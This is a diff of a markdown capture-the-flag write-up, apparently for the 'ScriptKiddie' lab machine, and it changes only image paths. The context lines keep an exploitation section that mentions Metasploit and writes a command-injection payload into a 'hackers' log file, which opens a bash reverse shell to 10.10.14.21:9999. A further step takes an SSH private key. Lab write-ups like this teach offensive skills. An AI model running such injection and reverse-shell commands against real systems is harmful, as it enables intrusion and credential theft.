@@ -23,11 +23,11 @@ image:
 
 # EXPLOITATION
 
-![picture 21](images/57b2b3ec41b8f3813882210be6efb5d17a3eac1a39c0e05de1a01439633a8693.png)
+![picture 21](/assets/images/57b2b3ec41b8f3813882210be6efb5d17a3eac1a39c0e05de1a01439633a8693.png)
 
 Using metasploit
 
-![picture 22](images/8ede237222b9c4ccf385ec9520c8cd4e13ff97bec7a4315f37995f9f585e25c2.png)
+![picture 22](/assets/images/8ede237222b9c4ccf385ec9520c8cd4e13ff97bec7a4315f37995f9f585e25c2.png)
 
 ```
 kid@scriptkiddie:~/html$ id
@@ -64,7 +64,7 @@ if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
 kid@scriptkiddie:~/logs$ echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/9999 0>&1' #" >> hackers
 ```
 
-![picture 23](images/ec1df5b4861ac839fa1bb9ef1da7c5e237ca15642ad57650b3cdcd4e36f9e792.png)
+![picture 23](/assets/images/ec1df5b4861ac839fa1bb9ef1da7c5e237ca15642ad57650b3cdcd4e36f9e792.png)
 
 get .ssh/id_rsa and connect with ssh
 
